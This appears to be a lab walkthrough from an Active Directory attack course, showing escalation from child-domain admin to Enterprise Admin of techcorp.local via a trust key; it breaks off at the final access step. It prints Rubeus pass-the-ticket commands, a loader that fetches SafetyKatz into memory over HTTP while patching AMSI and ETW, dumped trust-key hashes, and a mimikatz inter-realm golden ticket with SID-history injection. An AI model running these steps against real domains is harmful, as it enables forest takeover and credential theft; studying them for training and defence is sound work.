# Hands-On 20:

```
Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent
domain, techcorp.local using the domain trust key.
```
## Index Of Content:

  1. [Escalate Privileges to Enterprise Admin](#escalate-privileges-to-enterprise-admin)


## Escalate Privileges to Enterprise Admin

From elevated privileges on the local attacker machine using rubeus spawn new process cmd:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[!] Pre-Authentication required!
[!]     AES256 Salt: US-DCAdministrator
[*] Using aes256_cts_hmac_sha1 hash: db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\administrator'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/28/2023 11:21:22 AM
  EndTime                  :  2/28/2023 9:21:22 PM
  RenewTill                :  3/7/2023 11:21:22 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  PeaMDnTxS96AbkqMQIR4z5CnxaUdjOGqspIWPL8O32w=
  ASREP (key)              :  DB7BD8E34FADA016EB0E292816040A1BF4EEB25CD3843E041D0278D30DC1B335
```

Validate the previous ticket:

```
C:\Windows\system32>klist

Current LogonId is 0:0x738a20d

Cached Tickets: (1)

#0>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/28/2023 11:21:22 (local)
        End Time:   2/28/2023 21:21:22 (local)
        Renew Time: 3/7/2023 11:21:22 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

The next step is copy the binary Loader.exe con the target US_DC server and access :

```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
Does \\us-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied

C:\Windows\system32>winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

```
On the attacker side startup a python HTTP server on the port 8989:

```
C:\AD\Tools>python -m SimpleHTTPServer 8989
Serving HTTP on 0.0.0.0 port 8989 ...
192.168.1.2 - - [28/Feb/2023 11:25:48] "GET /SafetyKatz.exe HTTP/1.1" 200 -

```

On the attacker side Load the binary SafetyKatz.exe directly on memory, previously is required create a network proxy rule using netsh:

```
C:\Users\Administrator>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8989 connectaddress=192.168.100.17
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8989 connectaddress=192.168.100.17


C:\Users\Administrator>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments :

```

And dump full credentials:
Child to Forest Root - Trust Key

```
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://127.0.0.1:8080/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://127.0.0.1:8080/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

Domain: TECHCORP.LOCAL (TECHCORP / S-1-5-21-2781415573-3701854478-2406986946)
 [  In ] US.TECHCORP.LOCAL -> TECHCORP.LOCAL
    * 3/3/2023 8:43:18 PM - CLEAR   - e1 a2 3d 2a 10 f0 23 c2 9b 56 f2 53 74 d7 be f8 76 4c 26 8e 09 cd de 7e a9 2e 3d e4 5b bd 4b bb 54 c5 db 0a cd 57 31 6a 04 d8 9e 91 1a 0d d3 f3 8f 9d 60 db 74 3b 76 85 ce 5d fc d8 b5 83 be 8a 4f 57 32 84 34 f3 9c 87 4d 82 b7 5b 8c 67 09 05 e5 91 1f 3a 4f a6 e9 25 9a 73 b8 87 d5 2c 15 62 a4 f4 91 13 07 3a 4f 4c 4a e2 38 82 5d f9 cf 61 47 45 68 cd 8e 22 05 37 85 77 a6 df e8 ad f0 3d ab 41 d6 2d 53 2d 80 87 69 c9 db 49 f1 64 47 fd 2a 1c 84 88 bc bf c7 60 f6 27 ad ec f3 5e 05 da 15 40 49 7f fe 7d 19 70 e8 e5 31 06 21 e4 59 5d ee e8 f0 cb ed 0e 2d 00 12 83 9b 67 28 c2 59 0f 72 70 b9 2b 05 73 05 91 da af 96 45 40 ad 91 c6 80 89 65 1a d7 6f e7 ca b9 9b 09 b1 74 c2 78 90 59 fd f0 75 41 b8 e5 ab 80 89 96 b3 e0 2b 4d 60
        * aes256_hmac       92487b79106e3ee93f17034bc15cc9f95ac6742763333755579b55cd8c3d8005
        * aes128_hmac       edee3b516d9c1df5582ea761473a91d0
        * rc4_hmac_nt       d44ad28e250461034e49cf3d1967c835

 [ Out ] TECHCORP.LOCAL -> US.TECHCORP.LOCAL
    * 3/3/2023 8:05:44 PM - CLEAR   - 08 76 48 07 f0 d8 1d 00 6b 76 11 c7 e0 6c bc 7d d8 62 0c 5b ab 47 e2 33 bc 35 6a 74 69 fa fa 34 5c 46 f1 0f c9 41 58 0e 75 18 f7 f0 c7 3e ca b6 17 b7 86 2b e9 cc ab 6b e0 80 7c b6 b1 ab 86 8a 70 f3 7e cf 62 d0 10 3a 1e 53 c7 d6 4c 55 3c 08 05 24 18 43 ca 89 26 50 40 c7 ed e2 07 4c 62 b3 55 1e a0 59 e3 4e ca 99 47 69 84 3d 6d 13 4b e7 03 73 31 6b dd b5 d5 99 d6 ec 1c b6 00 92 75 63 8d 3d 56 03 c6 c6 3c a1 13 fa 18 75 d5 84 96 de 57 54 52 8b 3b 7d 96 79 37 ed 5e 1e bc 8a 99 f4 01 9d 4d dd ee ac fe c8 27 87 24 7d 9c d9 cc 5a c5 8e 77 06 bb c4 a3 6a 25 80 75 21 e8 4d 29 c6 5e 5c 2d c7 2d 5c c3 c7 5a 7c 2f b0 02 0a 2f fd b3 d1 62 ab a9 9f c3 03 62 41 d0 33 b8 cb 63 1d a0 6a 29 5c af de fc 2a f1 f8 04 d2 8f bb 01 fd
        * aes256_hmac       e8d49a6b7cc47e89af816dc0a112fb1ef9bff691e813019b92ae074c8cabf15e
        * aes128_hmac       250c7ac25b83dd384b53ea4afa2dfa48
        * rc4_hmac_nt       3ceeab98c2d2a8667bd663bffc28f072

 [ In-1] US.TECHCORP.LOCAL -> TECHCORP.LOCAL
    * 12/11/2022 8:35:34 AM - CLEAR   - 67 0e 4a 27 70 f1 87 25 aa 93 80 2b f8 59 11 fa 90 24 84 e6 db f8 4d b3 00 3e ba 88 51 b3 19 e7 a2 72 15 5f 14 64 f5 d7 f7 98 a2 56 1c ce 62 09 11 fb f2 93 ce b9 16 b9 47 f9 1b 2b 42 3d 86 ed e7 ef d7 d9 98 76 fa ad 62 13 54 c8 05 28 26 6f e6 2c f5 f9 6d 12 60 20 3a 1f 00 33 4b 35 e4 5d 4c 49 18 0e 51 f7 e6 13 32 f3 8d b6 cc 33 5b 0d 32 ee 19 e6 b8 31 6c cd e0 9e e3 d9 07 e0 87 1c d8 e0 ac fb ee 45 ed d2 65 33 20 f1 f3 ea d6 f6 c6 d4 a8 a4 9b 2c a3 7c 56 12 c1 ad 33 ed fa f4 46 98 97 c5 1e 22 84 47 f5 3f 72 ab 0c 03 71 aa 83 87 01 45 00 28 e1 20 7f f4 6f e4 4b 18 bc 90 f2 08 33 c9 e9 84 bd e4 7f 1d d8 67 d6 e1 27 6d 8f 6e c0 ac bf 34 a2 72 16 1c 0f c4 9c 66 35 e2 94 80 2f 65 f2 34 21 34 ea 1d ac c9 51 6f 0a 5d
        * aes256_hmac       103bd68f79d6b229674005186d58ccc4313732fff1a7d71cdd8bc0b75fb17860
        * aes128_hmac       fce23bfcbb8465bab0af0385ca079a82
        * rc4_hmac_nt       c571b906ca96798300442abb5e509fda

 [Out-1] TECHCORP.LOCAL -> US.TECHCORP.LOCAL
    * 3/3/2023 8:05:44 PM - CLEAR   - c6 22 17 9e a0 f4 09 30 de 28 09 d4 c4 79 90 92 ab aa e3 76 e5 3c 05 5f e9 36 c9 ba 67 bc 8a 5b e3 ff 4f 2d 73 e7 e9 57 1c f4 b6 47 72 a1 68 9e ed 1c 79 66 56 eb b5 62 fe 31 92 1a 8b 2c aa 15 14 29 a9 c4 66 5e fe 5a 80 36 84 91 9e 59 3e 8a d6 90 d0 5e 3a 77 8b 96 26 a1 40 ed 92 c4 23 53 30 31 b9 bd a4 ce 6f 6e 2a 8f b3 db 94 2f 88 81 ca 2c 48 4b 93 bc ad 51 af 10 3d 71 c9 4b b3 ac 5e eb 3b 6b e8 f3 85 fd e0 0e de 3f 7f 27 f1 a0 7b 10 1a 6d 9d 7f f8 14 8b 23 0e 96 2f 39 d7 62 0b c7 b0 1d 56 a1 b9 b1 af cc 71 0f 48 d4 39 29 1a 23 fa f8 78 a8 18 fb 24 0c 77 29 90 22 10 bc 44 3e 2e 73 49 6a 49 2f 82 be 95 5c 0a 21 58 7b b4 80 66 b0 37 f3 be 19 b2 86 1d fc 0c 19 69 6f 6f 46 c1 a7 09 71 bc a2 61 24 75 ef a6 29 04 8f
        * aes256_hmac       792204b3e3df836bcb8dc958c1ddc39eeef22835276957de6a84e31cc37ba3cc
        * aes128_hmac       3e517b47c5966385c672735ea17513f5
        * rc4_hmac_nt       f01daadf07fa71bdb343e882063bc0de


Domain: EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)
 [  In ] US.TECHCORP.LOCAL -> EU.LOCAL
    * 3/3/2023 8:43:55 PM - CLEAR   - 0d 84 dd ce 24 e2 0f 30 55 eb 90 66 53 d8 4e 10 01 7c d1 ce d8 62 2b 8f 1d eb 51 cd 76 ed 79 dd 90 4c 15 bb 33 aa e1 fb 1b ea d6 3c 50 41 2a ed 72 f8 75 c8 eb 51 e6 03 ec 35 09 33 68 9b c0 47 48 68 0f fa 65 ed 44 c9 6f 21 a6 d3 f5 f2 77 ad 8d 56 49 50 07 72 8a 22 e4 37 56 b9 07 98 8f ab d7 ef 4c 63 05 8e 77 c5 27 0c 2f b8 46 ec 12 40 22 a1 d0 09 82 e5 8c c7 aa c7 e8 7b 3c d4 51 8c de 41 ce 88 f8 a9 f3 d3 21 87 20 f5 65 42 31 9f c5 18 7b 47 03 16 d1 8a bb 73 65 7b cf f8 1e 81 a7 da 2b 42 49 d4 8c 5f e1 8f dd 91 54 99 6f df 20 ef cc 3c 35 dc f2 ff 33 d1 82 e7 e1 d0 4c 9f 93 b2 df 50 1b c6 21 29 4c b8 ca 45 cd d6 55 db 87 3e 1b bf 74 ad 38 cf 90 93 3e 8c d2 54 9c 91 67 2f 1b 20 3f ef 81 9d c4 e9 fe 2d 1d 2c 9f 46
        * aes256_hmac       823258a8c5a011834594c5366362a2a967d826887456a689549d20dd5b4ba372
        * aes128_hmac       c7c80293458c07a0e3bdaa287b3bdc43
        * rc4_hmac_nt       9f153d6fa608f801a6fd817132130876

 [ Out ] EU.LOCAL -> US.TECHCORP.LOCAL
    * 3/3/2023 8:05:44 PM - CLEAR   - 57 a7 6d b6 12 ab 51 56 2b c6 e8 97 0b 31 ae 4f 30 b8 c1 0f 6c eb dd e9 d6 4a c2 9c 3c 7a 00 d2 0b 0a 81 02 9c d5 fc 1e aa 60 f5 4b 63 ef 33 56 4b 7d ae 41 58 85 8a a9 67 1e 06 c3 4a f8 50 e8 2f 75 22 b0 70 63 e7 a8 ec 36 3a a9 fd 96 f1 01 69 92 7f 43 ce 0c 56 fd f5 50 14 fc 2b 0e 13 fe b4 09 42 48 cc ef 95 bd 43 bc 34 da b9 b1 09 13 0d bb cf 85 7b e5 74 48 b7 c6 66 b6 a9 77 c6 c9 f8 4c ba 09 68 70 c9 4b 40 44 4b 59 69 1b df 4d 44 09 0e 8e aa c6 af bd 79 0b 76 52 ca e1 f1 99 27 d8 5e 70 08 32 15 a7 df 38 77 45 e2 5d 13 d2 a7 2e e7 07 32 c0 98 f5 7d 37 94 99 20 84 67 80 a4 f2 13 a5 d0 ef b1 e9 bf 6f e5 22 87 43 ea 25 d2 23 29 94 c0 e8 ff 9d ca 2f b6 79 94 1c 1b bf af 7e bc 65 ad c0 2b fb 47 b5 cc 1c a9 98 75 f6
        * aes256_hmac       ff0626e140d710c7b8b0ececc7077793169e18cae4b2cc70a90004bba46579f7
        * aes128_hmac       51ba184b479858abcbcd2cb0a9f437ef
        * rc4_hmac_nt       32d4e11814ebeaf5044d3b35f6f8d6b0

 [ In-1] US.TECHCORP.LOCAL -> EU.LOCAL
    * 12/11/2022 8:35:35 AM - CLEAR   - 50 7a 16 35 98 ae e6 65 0d 41 99 b5 c7 c5 f0 0d 63 ea b1 d8 84 67 df 40 41 ca cd 92 e7 b0 5c 7b 08 b7 c7 62 94 0f f0 d8 e7 2e 46 e2 8d 9b a1 f4 3b a6 ab a5 7b c5 9c 12 d4 e7 f5 5a 5d 85 ea ea fc 4f 8f 39 42 ae 04 2d 1e 24 10 c7 81 84 b6 0d 4f 4b a9 ef 8e cd 61 e5 0a dd e0 0c 70 48 5f 27 74 41 fb 35 bb 16 e7 fd 0a a6 23 5a 1b de 53 7d 06 ab b0 0d 80 12 6e 83 2f b5 38 85 2f b2 68 91 9a c3 e1 d9 73 9e bd d4 0c 79 8b 05 a1 d4 3a ee 4f 81 bd 90 2e 8e dd 9b 78 e1 00 45 b1 6a fd 7f f6 0e de 01 8e fd 30 80 f1 7c 8e 5f 5e 4f 00 98 66 90 ce 09 d9 8e a4 c8 17 ab 6c c0 12 a6 22 bb f1 a3 61 bb 32 73 27 ba ba 0a 20 85 45 9d 55 68 88 fd 07 75 82 db 37 cc b5 1f 6e c4 7f e0 0b 4f 78 95 ce 71 3f 98 5d c0 c3 b0 7a 33 8e f9 24 85
        * aes256_hmac       99041b743c444af5205cc2f8e2842c290af5f9fde732bd37833a354f7224ebac
        * aes128_hmac       1862ad074db1882131c3c3e338594972
        * rc4_hmac_nt       94622325b64320a2376df0cecd73fcad

 [Out-1] EU.LOCAL -> US.TECHCORP.LOCAL
    * 3/3/2023 8:05:44 PM - CLEAR   - 42 87 57 28 a5 34 b0 c2 b8 31 9c 05 57 61 de 88 73 71 e3 b0 b8 ac 87 f8 1e 5f 2c c7 66 fb 6c 89 0b a7 eb 30 04 a2 11 f2 7f 24 1e 1c ab 25 43 bf 31 98 cb b1 96 9e 86 80 d2 83 cc 62 b4 f8 33 66 7d 62 04 b3 ab 6a a2 c8 c9 6a 0b 40 87 ff 37 67 0a 78 ae ea 93 02 33 3f 50 fc 19 d2 16 ab 4d 5d 27 af cf 01 f8 8f eb af 5a a1 15 3c ba 5a 9f 98 c2 22 22 8c b7 6d 6b b2 04 aa a1 8c 72 f6 fc b4 78 83 b3 f0 2e f2 ba c2 8d 44 f6 2c 8b 4c 6b 1a c0 19 9d fc e7 b4 a9 ac b0 79 fe e4 78 d8 19 b2 0f 28 9c 19 3e 32 d1 76 f9 a7 9a 10 eb da 33 ce e3 91 db fd dc 03 6a a5 22 64 d1 8b 19 60 81 8e 15 0b fc 27 90 26 63 e8 ae 12 61 06 7b 33 60 f4 7a 32 23 f6 f3 bd 03 d0 90 b0 d2 c8 3b 60 9c c0 fd 6d fc b5 e6 b2 c7 2c 4e af 35 83 62 4c ce 2f
        * aes256_hmac       b687515d5f74d8aa87a2755fea6eb13713df31668d8d522d916a9dc91565d37c
        * aes128_hmac       d8a7f052a1450f9f8343f784027f11fd
        * rc4_hmac_nt       6deccf44bd8c61b7494a4bcce4622fc5

```

Let's forge an inter-realm TGT between two domains with golden module:

```
Kerberos::golden The mimikatz module
/domain:us.techcorp.local FQDN of the current domain
/sid: S-1-5-21-210670787-2521448726-163245708 SID of the current domain
/sids: S-1-5-21-2781415573-3701854478-2406986946 -519 SID of the enterprise admins group of the parent domain
/rc4: d44ad28e250461034e49cf3d1967c835 RC4 of the trust key
/user:Administrator User to impersonate
/service:krbtgt Target service in the parent domain
/target:techcorp.local FQDN of the parent domain
/ticket:C:\AD\Tools\kekeo\trust_tkt.
kirbi Path where ticket is to be saved
```




```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:d44ad28e250461034e49cf3d1967c835 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_us_techcorp.kirbi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:d44ad28e250461034e49cf3d1967c835 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_us_techcorp.kirbi
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2781415573-3701854478-2406986946-519 ;
ServiceKey: d44ad28e250461034e49cf3d1967c835 - rc4_hmac_nt
Service   : krbtgt
Target    : techcorp.local
Lifetime  : 3/4/2023 3:44:07 AM ; 3/1/2033 3:44:07 AM ; 3/1/2033 3:44:07 AM
-> Ticket : C:\AD\Tools\trust_us_techcorp.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz(commandline) # exit
Bye!


```
Request TGS for exported intra-ticket on the parent root AD FOrest using the service CIFS/techcorp-dc.techcorp.local :

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_us_techcorp.kirbi /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'CIFS/techcorp-dc.techcorp.local'
[*] Using domain controller: techcorp.local (192.168.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  CIFS/techcorp-dc.techcorp.local
  ServiceRealm             :  TECHCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  us.techcorp.local
  StartTime                :  3/4/2023 3:50:21 AM
  EndTime                  :  3/4/2023 1:50:21 PM
  RenewTill                :  3/11/2023 3:50:21 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  rLSSrucT3MoO4ilDaJIhi5lQThU4R5F41THMU36PrDA=


```

Access to parent domain controller with imported ticket:

```
